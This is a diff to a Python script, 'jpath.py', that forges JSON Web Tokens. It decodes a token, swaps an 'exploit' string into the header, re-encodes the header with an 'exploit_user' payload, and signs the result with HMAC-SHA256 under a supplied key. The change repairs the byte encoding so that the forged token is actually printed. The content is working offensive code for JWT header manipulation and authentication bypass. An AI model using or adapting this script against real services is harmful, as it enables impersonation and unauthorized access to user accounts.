@@ -18,7 +18,7 @@ RESETT = Fore.RESET
 parser = argp.ArgumentParser(
     description=__doc__,
     prog="jpath.py",
-    formatter_class=ColorHelpFormatter, #argp.RawDescriptionHelpFormatter
+    formatter_class=ColorHelpFormatter,
     epilog='''
     This script was made for Moises Tapia
     ''')
@@ -100,12 +100,7 @@ print("PAYLOAD: " + MAG + payload_decode + RESETT)
 print("\n" + "Ecode the new payload...."+ "\n")
 
 new_hederjwt = header_decode.replace(search, exploit)
-print(type(new_hederjwt))
-
-#base64.urlsafe_b64encode(json.dumps(new_hederjwt)).rstrip("=")+"."+
-urlstr = base64.urlsafe_b64encode(json.dumps(exploit_user)).rstrip("=")
-
-sig = base64.urlsafe_b64encode(hmac.new(key,urlstr,hashlib.sha256).digest()).decode('utf8').rstrip("=")
-
+urlstr = base64.urlsafe_b64encode(bytes(json.dumps(new_hederjwt),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(exploit_user),encoding='utf8')).decode('utf8').rstrip("=")
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),urlstr.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
 
 print(urlstr+"."+sig)
